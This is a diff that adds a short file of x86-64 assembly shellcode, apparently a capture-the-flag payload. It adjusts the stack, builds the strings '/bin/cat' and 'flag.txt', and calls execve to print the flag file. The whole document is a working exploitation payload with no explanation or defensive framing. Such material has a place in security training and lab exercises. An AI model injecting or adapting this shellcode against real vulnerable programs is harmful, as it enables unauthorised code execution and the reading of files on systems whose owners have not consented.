@@ -1,0 +1,27 @@
+mov rax, rsp
+add al, 0xaf
+mov rsp, rax
+xor rax, rax
+
+xor 	rsi,	rsi
+push	rsi				
+mov 	rdi,	0x7461632f6e69622f	 ;/bin/cat
+push	rdi
+		
+mov	rdi,rsp
+
+push rsi
+mov rax, 0x7478742e67616c66   ;flag.txt
+push rax
+
+mov rax, rsp
+
+push rsi
+push rax
+push rdi
+mov rsi, rsp
+	
+xor rax, rax			
+mov 	al,	59			
+cdq		
+syscall
